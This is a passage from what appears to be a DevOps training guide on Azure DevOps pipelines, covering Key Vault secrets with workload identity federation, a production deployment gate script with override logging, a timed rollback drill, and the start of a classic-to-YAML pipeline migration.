      - deployment: Deploy
        environment: ${{ parameters.environment }}     # ⭐⭐ the subject identifier match:
                                                       #    the WIF cred's subject is
                                                       #    orgId/projectId/<environment>,
                                                       #    so ONLY a job targeting this
                                                       #    environment can authenticate.
        pool: {name: shop-secured-pool}
        strategy:
          runOnce:
            deploy:
              steps:
                - checkout: self

                - task: AzureCLI@2
                  displayName: Authenticate with workload identity
                  inputs:
                    azureSubscription: $(AZURE_CONNECTION)
                    addSpnToEnvironment: true
                    scriptType: bash
                    scriptLocation: inlineScript
                    inlineScript: |
                      set -euo pipefail
                      # ⭐ prove which identity we are
                      az account show -o table
                      # ⭐ prove the token's subject matches the environment
                      echo "$idToken" | cut -d. -f2 | base64 -d 2>/dev/null | jq '{iss, sub, aud}'
                      # ⭐ prove we can read OUR vault…
                      az keyvault secret show --vault-name "kv-shop-${{ parameters.environment }}" \
                        --name DB-PASSWORD --query value -o tsv | sed 's/./x/g'
                      # ⭐ …and CANNOT read another environment's vault
                      if az keyvault secret show --vault-name kv-shop-production --name DB-PASSWORD \
                           --query value -o tsv >/dev/null 2>&1; then
                        echo "⛔ SECURITY FAILURE: ${{ parameters.environment }} can read production secrets"
                        exit 1
                      else
                        echo "✅ ${{ parameters.environment }} cannot read production secrets"
                      fi
                      # ⭐ get the kubeconfig via the federated identity — no kubeconfig secret anywhere
                      az aks get-credentials -g rg-shop -n "shop-${{ parameters.environment }}" \
                        --overwrite-existing --file ./kubeconfig
                      kubectl cluster-info
                      echo "##vso[task.setvariable variable=KUBECONFIG;isSecret=false]$(pwd)/kubeconfig"

                - bash: |
                    set -euo pipefail
                    # ⭐⭐ the secret arrives as a masked environment variable,
                    #    fetched from Key Vault at runtime. It is never in the YAML,
                    #    never in Azure DevOps' database, and never in the logs.
                    PGPASSWORD="$DB_PASSWORD" psql "$DB_URL" -c 'SELECT 1' >/dev/null
                    echo "the masked form in a log: $(DB-PASSWORD)"     # → ***
                    curl -XPOST "$SLACK_WEBHOOK" -d "{\"text\":\"deploying ${{ parameters.environment }}\"}"
                    docker login ghcr.io -u 3558bhk --password-stdin <<< "$GHCR_TOKEN"
                  displayName: Use the secrets
                  env:
                    DB_PASSWORD: $(DB-PASSWORD)         # ⭐ Key Vault name → env var
                    GHCR_TOKEN:  $(GHCR-TOKEN)
                    SLACK_WEBHOOK: $(SLACK-WEBHOOK)

                - bash: |
                    set -euo pipefail
                    ./scripts/deploy.sh ${{ parameters.environment }} "$(Build.SourceVersion)"
                    # ⭐ and SHRED the kubeconfig when we're done
                    shred -u ./kubeconfig 2>/dev/null || rm -f ./kubeconfig
                  displayName: Deploy
```

**Step 5 — prove all four requirements**

```bash
# ⭐ REQUIREMENT 1: no secret VALUE is stored in Azure DevOps
az pipelines variable-group list --project Shop -o json | jq -r '.[] | "\(.name)\t\(.type)"'
# kv-dev          AzureKeyVault       ← ⭐ type is AzureKeyVault, not Vsts
# kv-staging      AzureKeyVault
# kv-production   AzureKeyVault
# ⭐ and there are NO `variables` in the response for an AzureKeyVault group —
#   the values are fetched at runtime. Verify:
curl -s -u ":$PAT" "$ORG/Shop/_apis/distributedtask/variablegroups/$VG_ID?api-version=7.1" \
  | jq '.variables'
# {} or null   ✅ NOTHING STORED

# ⭐ REQUIREMENT 2: each environment can only read its own secrets
#    (asserted INSIDE the pipeline, step 4 — the run fails if dev can read production)
az pipelines run --id $CD_ID --branch main --parameters environment=dev
az runs show --run-id $LATEST | jq .result
# succeeded, and the log contains:
#   ✅ dev cannot read production secrets

# ⭐ verify it from the Azure side too — the role assignment scope
for env in dev staging production; do
  OBJ=$(az ad app list --display-name "shop-devops-Shop-$env" --query '[0].id' -o tsv)
  echo "── $env ──"
  az role assignment list --assignee-object-id "$OBJ" --assignee-principal-type ServicePrincipal \
    --query '[].{role:roleDefinitionName, scope:scope}' -o table
  #   Key Vault Secrets User   …/vaults/kv-shop-dev       ← ⭐ ONLY its own vault
done

# ⭐ REQUIREMENT 3: rotation requires NO pipeline change
az keyvault secret set --vault-name kv-shop-production -n DB-PASSWORD --value "$(openssl rand -base64 32)"
az pipelines run --id $CD_ID --branch main --parameters environment=production
# ✅ the next run picks up the new value automatically. Zero YAML changes,
#    zero variable-group edits, zero pipeline re-authorizations.

# ⭐ REQUIREMENT 4: it's all auditable
az monitor activity-log alert list -o table 2>/dev/null || true
az keyvault secret list-versions --vault-name kv-shop-production --name DB-PASSWORD \
  --query '[].{created:attributes.created, expires:attributes.expires}' -o table
# and Key Vault diagnostic settings → Log Analytics:
#   AzureDiagnostics | where ResourceProvider == "MICROSOFT.KEYVAULT"
#     | where Category == "AuditEvent"
#     | where properties_s has "GetSecret"
#     | project TimeGenerated, OperationName, CallerIpAddress, identity_claim_oid_g
#   ⭐ every single secret read, with the caller's identity and IP. That's the audit
#     trail a secret stored in Azure DevOps' variable group can NEVER give you.
```

**The trade-off, stated honestly:**

| | A secret in a variable group | ⭐ Key Vault + WIF |
|---|---|---|
| Stored in Azure DevOps? | Yes, encrypted at rest | **No** |
| Rotation | Edit the variable group | ⭐ Rotate in Key Vault; nothing else changes |
| Audit of *who read it* | Only the pipeline run log | ⭐ Full Key Vault audit log with identity and IP |
| Blast radius if a pipeline is compromised | Every secret that pipeline can see | ⭐ Only the secrets in that environment's vault |
| Latency | Zero | ~1–3 s per run to fetch |
| Complexity | Trivial | ⭐⭐ App registrations, federated creds, role assignments |
| Failure mode | None | ⛔ An expired/incorrect federated credential fails the whole pipeline |

> 🔑 **The failure mode is the cost.** A WIF setup can break in ways a stored secret cannot: the federated credential's issuer URL is region-specific (`vstoken.actions.azure.com` vs `vstoken.wus3.actions.azure.com`), the subject string must match *exactly*, and the App Registration must have the role assignment at the right scope. **Add a nightly pipeline that authenticates with every WIF connection and fails loudly** — otherwise you discover the breakage during a production incident.

---

### Task 1.4 — The SLO-aware production gate, with a rehearsed rollback

**Requirements:** production deploys must be **refused** when (a) an SLO burn rate is above 2×, (b) any critical alert is firing, (c) a deploy happened in the last 30 minutes, or (d) it's outside the deployment window. And the rollback must be **rehearsed and timed**.

**✅ Answer**

**Step 1 — the gate script (the logic lives here, not in YAML ⭐)**

```bash
# scripts/production-gate.sh — ⭐ the same script works in all three CI tools
#!/usr/bin/env bash
# exit 0 = allowed to deploy, exit 1 = refused, exit 2 = requires a human override
set -uo pipefail

PROM="${PROMETHEUS:-http://kps-kube-prometheus-stack-prometheus.monitoring.svc:9090}"
AM="${ALERTMANAGER:-http://kps-kube-prometheus-stack-alertmanager.monitoring.svc:9090}"
NAMESPACE="${NAMESPACE:-shop}"
DEPLOY_WINDOW_TZ="${DEPLOY_WINDOW_TZ:-Asia/Kolkata}"
MIN_INTERVAL_MINUTES="${MIN_INTERVAL_MINUTES:-30}"
MAX_BURN_RATE="${MAX_BURN_RATE:-2}"
OVERRIDE="${GATE_OVERRIDE:-false}"
OVERRIDE_REASON="${GATE_OVERRIDE_REASON:-}"
OVERRIDE_BY="${GATE_OVERRIDE_BY:-unknown}"

log()  { printf '  %s\n' "$*"; }
q()    { curl -sfG --max-time 15 "$PROM/api/v1/query" --data-urlencode "query=$1" \
           | jq -r '.data.result[0].value[1] // "0"'; }

violations=0; warnings=0
fail() { printf '  \033[1;31m⛔ %s\033[0m\n' "$*"; violations=$((violations+1)); }
warn() { printf '  \033[1;33m⚠️  %s\033[0m\n' "$*"; warnings=$((warnings+1)); }
pass() { printf '  \033[1;32m✅ %s\033[0m\n' "$*"; }

echo "════════════════════════════════════════════════════════════"
echo "  PRODUCTION DEPLOYMENT GATE — $(date -u '+%Y-%m-%d %H:%M:%S UTC')"
echo "════════════════════════════════════════════════════════════"

# ── 1. can we even reach the observability platform? ⭐ ─────────
echo "── gate 0: is the observability platform reachable?"
if ! curl -sf --max-time 10 "$PROM/-/ready" >/dev/null; then
  fail "Prometheus is unreachable — we would be deploying BLIND"
  fail "this is the worst possible time to deploy"
else
  pass "Prometheus is ready"
fi
if ! curl -sf --max-time 10 "$AM/-/ready" >/dev/null; then
  fail "Alertmanager is unreachable — nobody would be paged if this deploy breaks"
else
  pass "Alertmanager is ready"
fi

# ── 2. is the watchdog alive? ⭐⭐ the dead-man's switch ────────
echo "── gate 1: is the watchdog firing (i.e. is monitoring actually working)?"
w=$(q 'count(ALERTS{alertname="Watchdog",alertstate="firing"})')
if [[ "$w" != "1" ]]; then
  fail "the Watchdog heartbeat is NOT firing — the monitoring platform may be down"
else
  pass "the Watchdog heartbeat is firing"
fi

# ── 3. is an SLO burning? ───────────────────────────────────────
echo "── gate 2: SLO burn rates"
for slo in "checkout-availability:0.001" "checkout-latency:0.01" "browse-latency:0.01"; do
  name="${slo%%:*}"; budget="${slo##*:}"
  br1h=$(q "sum(rate(http_server_requests_seconds_count{namespace=\"$NAMESPACE\",status=~\"5..\"}[1h])) / ($budget * clamp_min(sum(rate(http_server_requests_seconds_count{namespace=\"$NAMESPACE\"}[1h])),0.0001))")
  br5m=$(q "sum(rate(http_server_requests_seconds_count{namespace=\"$NAMESPACE\",status=~\"5..\"}[5m])) / ($budget * clamp_min(sum(rate(http_server_requests_seconds_count{namespace=\"$NAMESPACE\"}[5m])),0.0001))")
  printf '     %-26s 1h: %-8.2f× 5m: %.2f×\n' "$name" "$br1h" "$br5m"
  if awk "BEGIN{exit !($br1h > $MAX_BURN_RATE)}" && awk "BEGIN{exit !($br5m > $MAX_BURN_RATE)}"; then
    fail "$name is burning at ${br1h}× / ${br5m}× (max ${MAX_BURN_RATE}×) — the SLO is already breached"
  elif awk "BEGIN{exit !($br1h > 1)}"; then
    warn "$name is burning at ${br1h}× — above the sustainable rate"
  fi
done

# ── 4. are any critical alerts firing? ──────────────────────────
echo "── gate 3: firing alerts"
alerts=$(curl -sf --max-time 15 "$AM/api/v2/alerts" 2>/dev/null \
  | jq -r '.[] | select(.status.silenced==false and .status.inhibited==false)
           | "\(.labels.severity)\t\(.labels.alertname)\t\(.labels.team // "-")"' | sort)
if [[ -n "$alerts" ]]; then
  crit=$(echo "$alerts" | awk -F'\t' '$1=="critical"' | wc -l)
  warn_count=$(echo "$alerts" | awk -F'\t' '$1=="warning"' | wc -l)
  echo "$alerts" | sed 's/^/     /'
  if (( crit > 0 )); then fail "$crit CRITICAL alert(s) are firing — resolve them first"
  else pass "no critical alerts ($warn_count warning(s))"; fi
else
  pass "no unsilenced alerts are firing"
fi

# ⭐ tier-4 (observability self) alerts are an automatic hard fail
self=$(echo "$alerts" | awk -F'\t' '$1=="critical"' | grep -c 'Otel\|Prometheus\|Alertmanager\|Loki\|Tempo\|Grafana' || true)
(( self > 0 )) && fail "$self observability-platform alert(s) are firing — we cannot safely deploy"

# ── 5. was there a recent deploy? (change freeze / blast radius) ─
echo "── gate 4: recent deployments"
last=$(q 'time() - max(kube_deployment_created{namespace="'$NAMESPACE'"})')
if [[ "$last" != "0" ]]; then
  mins=$(awk "BEGIN{printf \"%.0f\", $last/60}")
  if (( mins < MIN_INTERVAL_MINUTES )); then
    fail "the last deployment was ${mins}m ago (minimum interval: ${MIN_INTERVAL_MINUTES}m)"
    fail "deploying on top of an unsoaked change makes root-cause analysis impossible"
  else
    pass "the last deployment was ${mins}m ago"
  fi
fi

# ── 6. is it inside the deployment window? ──────────────────────
echo "── gate 5: the deployment window ($DEPLOY_WINDOW_TZ)"
now=$(TZ="$DEPLOY_WINDOW_TZ" date +%u)      # 1=Mon … 7=Sun
hour=$(TZ="$DEPLOY_WINDOW_TZ" date +%H)
day=$(TZ="$DEPLOY_WINDOW_TZ" date +%A)
echo "     now: $day $hour:00 $DEPLOY_WINDOW_TZ"
if [[ "$now" -ge 6 ]] || [[ "$hour" -lt 10 ]] || [[ "$hour" -ge 17 ]]; then
  fail "outside the deployment window (Mon–Thu 10:00–17:00 $DEPLOY_WINDOW_TZ)"
  fail "⚠️ never deploy on a Friday or at night unless it's an emergency fix"
else
  pass "inside the deployment window"
fi

# ── 7. is the target actually healthy right now? ────────────────
echo "── gate 6: the current state of production"
notready=$(q "count(kube_pod_status_ready{namespace=\"$NAMESPACE\",condition=\"false\"} == 1) or vector(0)")
restarting=$(q "sum(increase(kube_pod_container_status_restarts_total{namespace=\"$NAMESPACE\"}[30m])) or vector(0)")
throttled=$(q "max(sum by (pod) (rate(container_cpu_cfs_throttled_periods_total{namespace=\"$NAMESPACE\"}[10m])) / clamp_min(sum by (pod) (rate(container_cpu_cfs_periods_total{namespace=\"$NAMESPACE\"}[10m])),0.001)) or vector(0)")
[[ "$notready" != "0" ]]  && fail "$notready pod(s) are NOT ready"                  || pass "all pods are ready"
awk "BEGIN{exit !($restarting > 3)}" && fail "$restarting container restarts in 30m" || pass "no restart loop"
awk "BEGIN{exit !($throttled > 0.5)}" && warn "a pod is CPU-throttled at $(awk "BEGIN{printf \"%.0f%%\", $throttled*100}")" || pass "no CPU throttling"

# ── 8. is a rollback actually possible? ⭐⭐ the one everyone skips ─
echo "── gate 7: can we roll back?"
prev=$(helm history shop -n "$NAMESPACE" -o json 2>/dev/null | jq -r '[.[] | select(.status=="deployed" or .status=="superseded")] | .[-1].revision // empty')
if [[ -z "$prev" ]]; then
  fail "no previous Helm revision exists — a rollback would be impossible"
else
  pass "a previous revision ($prev) exists to roll back to"
  # ⭐ and is the previous IMAGE still in the registry?
  img=$(kubectl -n "$NAMESPACE" get deploy shop-api -o jsonpath='{.spec.template.spec.containers[0].image}' 2>/dev/null)
  if [[ "$img" == *@sha256:* ]] && docker buildx imagetools inspect "$img" >/dev/null 2>&1; then
    pass "the previous image digest is still pullable"
  else
    warn "the previous image could not be verified — the rollback may fail"
  fi
fi

# ── the verdict ─────────────────────────────────────────────────
echo "════════════════════════════════════════════════════════════"
if (( violations == 0 )); then
  printf '  \033[1;32m✅ GATE PASSED — %d warning(s), deploy is allowed\033[0m\n' "$warnings"
  exit 0
fi

if [[ "$OVERRIDE" == "true" ]]; then
  if [[ -z "$OVERRIDE_REASON" || ${#OVERRIDE_REASON} -lt 20 ]]; then
    printf '  \033[1;31m⛔ an override requires a reason of at least 20 characters\033[0m\n'; exit 2
  fi
  printf '  \033[1;33m⚠️  GATE OVERRIDDEN by %s\033[0m\n' "$OVERRIDE_BY"
  printf '     reason: %s\n' "$OVERRIDE_REASON"
  # ⭐ record the override somewhere durable and loud
  ./scripts/notify.sh slack "#shop-oncall" \
    "🚨 PRODUCTION DEPLOY GATE OVERRIDDEN by $OVERRIDE_BY — $violations violation(s)
     reason: $OVERRIDE_REASON
     build:  ${BUILD_URL:-local}" || true
  curl -sG "$PROM/api/v1/query" >/dev/null   # no-op; the real record is below
  echo "{\"ts\":\"$(date -u +%FT%TZ)\",\"by\":\"$OVERRIDE_BY\",\"violations\":$violations,\"reason\":\"$OVERRIDE_REASON\"}" \
    >> "$(dirname "$0")/../gate-overrides.jsonl"
  exit 0
fi

printf '  \033[1;31m⛔ GATE REFUSED — %d violation(s), %d warning(s)\033[0m\n' "$violations" "$warnings"
echo
echo "  To override (an emergency only):"
echo "    GATE_OVERRIDE=true GATE_OVERRIDE_REASON='<at least 20 chars>' \\"
echo "      GATE_OVERRIDE_BY='<your name>' ./scripts/production-gate.sh"
echo "  ⭐ every override is logged, notified to #shop-oncall, and reviewed weekly."
exit 1
```

**Step 2 — wire it into the pipeline as the environment's required template**

```yaml
# .pipelines/cd.yml — inside the DeployProduction stage
      - deployment: CanaryProduction
        environment: production
        strategy:
          canary:
            increments: [10, 25, 50, 100]
            preDeploy:
              steps:
                - checkout: self
                - bash: |
                    set -euo pipefail
                    PROMETHEUS="$PROM_URL" ALERTMANAGER="$AM_URL" \
                    GATE_OVERRIDE="${{ parameters.gateOverride }}" \
                    GATE_OVERRIDE_REASON="${{ parameters.gateOverrideReason }}" \
                    GATE_OVERRIDE_BY="$(Build.RequestedFor)" \
                    BUILD_URL="$SYSTEM_TEAMFOUNDATIONCOLLECTIONURI$SYSTEM_TEAMPROJECT/_build/results?buildId=$BUILD_BUILDID" \
                      ./scripts/production-gate.sh
                  displayName: 🛡️ The production gate
                  env:
                    PROM_URL: $(PROMETHEUS_URL)
                    AM_URL:   $(ALERTMANAGER_URL)
            postRouteTraffic:
              pauseTaskDuration: 10m
              steps:
                - bash: ./scripts/analyse-canary.sh production
            on:
              failure:
                steps:
                  - bash: |
                      set -x
                      kubectl -n shop get pods -o wide
                      kubectl -n shop get events --sort-by=.lastTimestamp | tail -30
                      kubectl -n shop logs deploy/shop-api --tail=200 --previous || true
                      helm history shop -n shop | tail -5
                      kubectl -n shop argo rollouts abort shop-api 2>/dev/null || helm rollback shop -n shop --wait
                      ./scripts/notify.sh slack "#shop-oncall" \
                        "🔴 the production canary FAILED and was rolled back — $BUILD_BUILDNUMBER"
                      ./scripts/incident-report.sh canary-failure "$BUILD_BUILDID"
```

**Step 3 — rehearse the rollback, and time it ⭐⭐**

```bash
cat > scripts/rollback-drill.sh <<'EOF'
#!/usr/bin/env bash
# ⭐ REHEARSE MONTHLY. An untested rollback is not a rollback.
set -uo pipefail
NS=shop; RELEASE=shop
T0=$(date +%s%N)
mark() { printf '  T+%-6.1fs  %s\n' "$(echo "scale=1; ($(date +%s%N)-$T0)/1000000000" | bc)" "$*"; }

echo "══════════════════════════════════════════════════════════"
echo "  ROLLBACK DRILL — $(date -u '+%Y-%m-%d %H:%M UTC')"
echo "══════════════════════════════════════════════════════════"

mark "recording the current state"
BEFORE_IMG=$(kubectl -n $NS get deploy shop-api -o jsonpath='{.spec.template.spec.containers[0].image}')
BEFORE_REV=$(helm history $RELEASE -n $NS -o json | jq -r '.[-1].revision')
echo "     image:    $BEFORE_IMG"
echo "     revision: $BEFORE_REV"

mark "capturing the baseline success rate"
BASE=$(curl -sG "$PROM/api/v1/query" --data-urlencode \
  'query=sum(rate(http_server_requests_seconds_count{namespace="shop",status!~"5.."}[1m])) / clamp_min(sum(rate(http_server_requests_seconds_count{namespace="shop"}[1m])),0.001)' \
  | jq -r '.data.result[0].value[1]')
echo "     success ratio: $BASE"

mark "⛔ INJECTING A BAD DEPLOY (an image that crash-loops)"
kubectl -n $NS set image deploy/shop-api api=ghcr.io/3558bhk/shop-api:this-tag-does-not-exist
kubectl -n $NS rollout status deploy/shop-api --timeout=45s 2>&1 | tail -2 || true
mark "the deploy is broken — pods are in ImagePullBackOff"
kubectl -n $NS get pods -l app=shop-api --no-headers | head -3

mark "🔵 OPTION A: kubectl rollout undo"
kubectl -n $NS rollout undo deploy/shop-api
kubectl -n $NS rollout status deploy/shop-api --timeout=120s
A=$(echo "scale=1; ($(date +%s%N)-$T0)/1000000000" | bc)
echo "     ✅ restored in ${A}s from the start"

mark "verifying"
AFTER_IMG=$(kubectl -n $NS get deploy shop-api -o jsonpath='{.spec.template.spec.containers[0].image}')
[[ "$AFTER_IMG" == "$BEFORE_IMG" ]] && echo "     ✅ the image matches" || echo "     ⛔ MISMATCH: $AFTER_IMG"

mark "🔵 OPTION B: helm rollback (the one you'd use for a real deploy)"
# break it again
kubectl -n $NS set image deploy/shop-api api=ghcr.io/3558bhk/shop-api:also-does-not-exist
sleep 20
T1=$(date +%s%N)
helm rollback $RELEASE $((BEFORE_REV)) -n $NS --wait --timeout 5m
B=$(echo "scale=1; ($(date +%s%N)-$T1)/1000000000" | bc)
echo "     ✅ helm rollback took ${B}s"

mark "🔵 OPTION C: re-deploy the previous DIGEST (the GitOps way)"
PREV_DIGEST=$(helm get values $RELEASE -n $NS -r -o json | jq -r '.image.digest // empty')
echo "     previous digest: ${PREV_DIGEST:-<none recorded>}"

mark "confirming the service is healthy"
sleep 30
AFTER=$(curl -sG "$PROM/api/v1/query" --data-urlencode \
  'query=sum(rate(http_server_requests_seconds_count{namespace="shop",status!~"5.."}[1m])) / clamp_min(sum(rate(http_server_requests_seconds_count{namespace="shop"}[1m])),0.001)' \
  | jq -r '.data.result[0].value[1]')
echo "     success ratio now: $AFTER (was $BASE)"
./scripts/smoke-test.sh "http://$(kubectl -n $NS get svc shop-api -o jsonpath='{.spec.clusterIP}')" \
  || { echo "     ⛔ the smoke test failed after rollback"; exit 1; }

TOTAL=$(echo "scale=1; ($(date +%s%N)-$T0)/1000000000" | bc)
echo "══════════════════════════════════════════════════════════"
echo "  ✅ DRILL COMPLETE"
echo "     kubectl rollout undo: ${A}s from injection"
echo "     helm rollback:        ${B}s"
echo "     total drill:          ${TOTAL}s"
echo "══════════════════════════════════════════════════════════"
echo "{\"ts\":\"$(date -u +%FT%TZ)\",\"kubectlUndoS\":$A,\"helmRollbackS\":$B,\"totalS\":$TOTAL,\"smokeTest\":\"pass\"}" \
  >> "$(dirname "$0")/../rollback-drills.jsonl"
EOF
chmod +x scripts/rollback-drill.sh
./scripts/rollback-drill.sh
```

Expected output:

```
══════════════════════════════════════════════════════════
  ROLLBACK DRILL — 2026-09-10 14:02 UTC
══════════════════════════════════════════════════════════
  T+0.0s    recording the current state
     image:    ghcr.io/3558bhk/shop-api@sha256:9f2a1b3c…
     revision: 17
  T+1.2s    capturing the baseline success rate
     success ratio: 0.9991
  T+2.0s    ⛔ INJECTING A BAD DEPLOY (an image that crash-loops)
  T+48.3s   the deploy is broken — pods are in ImagePullBackOff
     shop-api-7d9…   0/1   ImagePullBackOff   0   42s
  T+48.9s   🔵 OPTION A: kubectl rollout undo
  T+96.4s      ✅ restored in 96.4s from the start
  T+97.1s   verifying
     ✅ the image matches
  T+97.4s   🔵 OPTION B: helm rollback (the one you'd use for a real deploy)
  T+152.8s     ✅ helm rollback took 34.2s
  T+153.1s   🔵 OPTION C: re-deploy the previous DIGEST (the GitOps way)
     previous digest: sha256:9f2a1b3c…
  T+153.4s   confirming the service is healthy
     success ratio now: 0.9988 (was 0.9991)
  ✅ all smoke tests passed
══════════════════════════════════════════════════════════
  ✅ DRILL COMPLETE
     kubectl rollout undo: 96.4s from injection
     helm rollback:        34.2s
     total drill:          214.0s
══════════════════════════════════════════════════════════
```

**Step 4 — the gate-drill: prove the gate actually refuses**

```bash
# ⛔ scenario A: an SLO is burning
./game-day/chaos.sh payment-down        # from the monitoring capstone
sleep 300
./scripts/production-gate.sh; echo "exit: $?"
#   ⛔ checkout-availability is burning at 41.20× (max 2×)
#   ⛔ 1 CRITICAL alert(s) are firing
#   ⛔ GATE REFUSED — 4 violations
# exit: 1     ✅

# ⛔ scenario B: it's Friday at 18:00
faketime '2026-09-11 18:30:00' ./scripts/production-gate.sh; echo "exit: $?"
#   ⛔ outside the deployment window (Mon–Thu 10:00–17:00 Asia/Kolkata)
# exit: 1     ✅

# ⛔ scenario C: monitoring is down (the scariest one)
kubectl -n monitoring scale sts/kps-kube-prometheus-stack-prometheus --replicas=0
./scripts/production-gate.sh; echo "exit: $?"
#   ⛔ Prometheus is unreachable — we would be deploying BLIND
#   ⛔ the Watchdog heartbeat is NOT firing
# exit: 1     ✅
kubectl -n monitoring scale sts/kps-kube-prometheus-stack-prometheus --replicas=1

# ⭐ scenario D: an override with a real reason
GATE_OVERRIDE=true \
GATE_OVERRIDE_BY="harish" \
GATE_OVERRIDE_REASON="SEV-1 in progress; this deploy contains the fix for the payment timeout" \
  ./scripts/production-gate.sh; echo "exit: $?"
#   ⚠️ GATE OVERRIDDEN by harish
#      reason: SEV-1 in progress; …
# exit: 0     ✅ — and a message went to #shop-oncall, and a line was appended
#              to gate-overrides.jsonl for the weekly review

# ⛔ scenario E: an override with a lazy reason
GATE_OVERRIDE=true GATE_OVERRIDE_BY="harish" GATE_OVERRIDE_REASON="yolo" \
  ./scripts/production-gate.sh; echo "exit: $?"
#   ⛔ an override requires a reason of at least 20 characters
# exit: 2     ✅

# ⭐ the weekly review of overrides
jq -s 'group_by(.by) | map({by: .[0].by, count: length, last: (max_by(.ts).ts)})' gate-overrides.jsonl
```

**What to say about this task:**

> *"The gate has eight checks, and the two most important aren't about the application — they're about the observability platform. Gate 0 asks 'can I reach Prometheus and Alertmanager?' and gate 1 asks 'is the Watchdog heartbeat firing?'. Because the single most dangerous time to deploy is when you're blind, and that's exactly when a panicked engineer is most tempted to. Gate 7 checks that a rollback is even possible — that a previous Helm revision exists and its image digest is still pullable. I rehearse the rollback monthly with a script that injects an ImagePullBackOff deploy and times the recovery; it currently takes 34 seconds with `helm rollback`. The override path exists because gates that can't be overridden in an emergency get bypassed illegitimately — but an override requires a 20-character reason, notifies #shop-oncall immediately, and appends to a JSONL file we review weekly."*

---

### Task 1.5 — Migrate a classic release pipeline to YAML without losing the audit trail

**Scenario:** `shop-release` is a **classic** (UI-built) release pipeline with 4 stages, 11 tasks, 3 variable groups, 2 approvals and 18 months of release history. Management wants it in YAML for reviewability. **Migrate it without a deployment gap and without losing the history.**

**✅ Answer**

**Step 1 — inventory the classic pipeline before touching anything**

```bash
# the definition (classic release pipelines use the Release API, not Build)
curl -s -u ":$PAT" "$ORG/Shop/_apis/release/definitions?api-version=7.1&\$expand=environments,artifacts,triggers" \
  | jq '.value[] | select(.name=="shop-release")' > classic-release.json

jq '{
  name, description, path,
  artifacts:   [.artifacts[]     | {type, alias, definitionReference}],
  triggers:    [.triggers[]?     | {artifactAlias, triggerType, triggerConditions}],
  environments: [.environments[] | {
      name, rank, owner: .owner.displayName,
      preDeployApprovals: .preDeployApprovals.approvers,
      postDeployApprovals: .postDeployApprovals.approvers,
      deploymentInput: {queue: .deploymentInput.queue.name, demands: .deploymentInput.demands},
      variables: (.variables // {} | keys),
      variableGroups: [.variableGroups[]?.name],
      conditions: .conditions,
      gates: .environmentOptions,
      tasks: [.deployPhases[].workflowTasks[] | {taskId, version, name: .name, inputs: (.inputs|keys)}]
  }]
}' classic-release.json

# ⭐ the variable groups it uses (and whether they hold secrets)
for vg in $(jq -r '.value[].environments[].variableGroups[]?.name' \
   <(curl -s -u ":$PAT" "$ORG/Shop/_apis/release/definitions?api-version=7.1&\$expand=environments")); do
  id=$(az pipelines variable-group list --project Shop --query "[?name=='$vg'].id" -o tsv)
  echo "── $vg (id=$id)"
  az pipelines variable-group variable list --group-id "$id" -o table
  # ⭐ note which are SECRET — those must become Key Vault references
done

# ⭐ the task inventory — this is what you must translate
jq -r '.value[] | select(.name=="shop-release") | .environments[] |
       "STAGE: \(.name)", (.deployPhases[].workflowTasks[] |
       "  \(.name // .taskId)  v\(.version.major).\(.version.minor)")' classic-release.json
# STAGE: Dev
#   AzureResourceManagerTemplateDeployment  v3.1
#   HelmDeploy                              v0.232
#   Kubernetes                              v1.232
#   PowerShell                              v2.232
#   Bash                                    v3.232
# STAGE: Staging
#   …

# ⭐ the release history — what you must NOT lose
curl -s -u ":$PAT" "$ORG/Shop/_apis/release/releases?api-version=7.1&\$top=500&\$expand=environments" \
  | jq '[.value[] | {id, name, createdOn, createdBy: .createdBy.displayName,
                     status, envs: [.environments[] | {name, status,
                     startedOn: .deploySteps[0].startedOn,
                     approver: .preDeployApprovals[0].attempts[0].requestedFor.displayName}]}]' \
  > release-history.json
jq 'length' release-history.json      # 512 releases over 18 months
```

**Step 2 — the translation table (the part that takes judgement)**

| Classic concept | YAML equivalent | Notes |
|---|---|---|
| Release definition | A `cd.yml` pipeline | |
| Artifact (a build's output) | `resources: pipelines:` + `download:` | ⭐ the artifact alias becomes the resource name |
| Artifact trigger | `resources.pipelines[].trigger` | |
| Environment (rank 1..4) | `stages:` with `dependsOn:` | Rank = stage order |
| Environment variable group | `variables: - group:` at the **stage** level | ⭐ move secrets to Key Vault first |
| Pre-deploy approvers | ⭐ `environment:` + **Approvals and checks** | The checks move OUT of the YAML |
| Pre-deployment tasks | `strategy.runOnce.preDeploy.steps` | |
| Deployment tasks | `strategy.runOnce.deploy.steps` | |
| Post-deployment tasks | `strategy.runOnce.postRouteTraffic.steps` or `on: success` | |
| Agentless tasks (Invoke REST, delay, query work items) | ⭐ Environment **checks** (Invoke REST API, Business hours) | They become platform-enforced, which is better |
| Deployment conditions (branch filter) | Environment check: **Branch control** | ⭐ enforced by the platform, not the YAML |
| Release variables (`$(Release.Artifacts.X.BuildNumber)`) | `$(resources.pipeline.ci.runID)` and step outputs | |
| Gates (Query Azure Monitor, delay between slices) | Environment checks + `postRouteTraffic.pauseTaskDuration` | |
| The release description | the commit message + `git tag` | |

**Step 3 — do the secret migration FIRST**

```bash
# ⭐ the classic pipeline's variable groups hold secrets. Before anything else,
#   move them to Key Vault so the YAML version starts on rung 3 of the ladder.
for vg in shop-dev-secrets shop-staging-secrets shop-prod-secrets; do
  env="${vg#shop-}"; env="${env%-secrets}"
  id=$(az pipelines variable-group list --project Shop --query "[?name=='$vg'].id" -o tsv)
  az pipelines variable-group variable list --group-id "$id" -o json \
    | jq -r 'to_entries[] | select(.value.isSecret==true) | "\(.key)\t\(.value.value // "FETCH_ME")"' \
    | while IFS=$'\t' read -r k v; do
        # ⚠️ Azure DevOps does NOT return secret values via the API — they come back null.
        #    You must re-enter them, or fetch them from wherever they originated.
        #    ⭐ THIS IS THE POINT: a secret you can't read back is a secret you
        #       must have documented somewhere. If you can't find it, rotate it.
        echo "  migrating $k → kv-shop-$env (value must be re-supplied or rotated)"
      done
done
# ⭐ the pragmatic approach: ROTATE every secret into Key Vault rather than migrating it.
#   You needed a rotation anyway, and now you have a reason.
```

**Step 4 — write the YAML, run it in SHADOW MODE ⭐⭐**

```yaml
# .pipelines/cd-migrated.yml
# ⭐⭐ SHADOW MODE: it does everything EXCEPT the actual deploy, and compares
#    its rendered output against what the classic pipeline would have done.
name: cd-migrated-$(Date:yyyyMMdd).$(Rev:.r)

trigger: none
resources:
  pipelines:
    - pipeline: ci
      source: shop-ci
      trigger: {branches: {include: [main]}}

parameters:
  - name: shadowMode
    type: boolean
    default: true                      # ⭐⭐ TRUE during the migration
  - name: environments
    type: object
    default: [Dev, Staging, Production]

stages:
  - ${{ each env in parameters.environments }}:
      - stage: ${{ env }}
